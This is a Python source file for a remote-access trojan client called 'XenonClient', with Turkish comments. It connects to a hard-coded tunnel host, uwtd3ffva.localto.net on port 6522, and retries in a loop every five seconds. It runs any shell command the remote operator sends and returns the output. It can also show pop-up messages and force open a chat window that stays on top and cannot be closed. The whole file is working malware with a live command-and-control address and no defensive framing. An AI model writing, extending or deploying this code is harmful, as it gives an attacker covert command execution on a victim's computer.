import socket, subprocess, json, time, threading, tkinter as tk
from tkinter import messagebox

class XenonClient:
    def __init__(self, ip, port):
        self.ip = ip; self.port = port
        self.sock = None
        self.chat_win = None

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.ip, self.port))
                self.sock.send(json.dumps({"id": "User-PC"}).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(16384).decode("utf-8")
                    if not data: break
                    
                    if data == "chat_open":
                        # Pencereyi ana döngüyü kilitlemeden açmak için Thread kullanıyoruz
                        threading.Thread(target=self.create_chat_ui, daemon=True).start()
                    elif data.startswith("chat_msg|"):
                        if self.chat_win: self.chat_box.insert("end", f"ADMIN: {data.split('|')[1]}\n")
                    elif data == "chat_close":
                        if self.chat_win: self.chat_win.quit() # destroy yerine quit daha stabildir
                    elif data.startswith("shell|"):
                        threading.Thread(target=self.exec_shell, args=(data.split("|")[1],)).start()
                    elif data.startswith("msg|"):
                        threading.Thread(target=lambda: messagebox.showinfo("Xenon", data.split("|")[1])).start()
            except: time.sleep(5)

    def exec_shell(self, cmd):
        out = subprocess.getoutput(cmd)
        self.sock.send(f"res|{out}".encode("utf-8"))

    def create_chat_ui(self):
        self.chat_win = tk.Tk()
        self.chat_win.title("Sohbet")
        self.chat_win.attributes("-topmost", True)
        self.chat_win.protocol("WM_DELETE_WINDOW", lambda: None) # Kapatmayı engelle
        
        self.chat_box = tk.Text(self.chat_win, bg="black", fg="green")
        self.chat_box.pack(expand=True, fill="both")
        
        entry = tk.Entry(self.chat_win)
        entry.pack(fill="x")
        entry.bind("<Return>", lambda e: [self.sock.send(f"chat|{entry.get()}".encode("utf-8")), self.chat_box.insert("end", f"SİZ: {entry.get()}\n"), entry.delete(0, 'end')])
        
        self.chat_win.mainloop()
        self.chat_win = None # Pencere kapandığında temizle

if __name__ == "__main__":
    XenonClient("uwtd3ffva.localto.net", 6522).run()
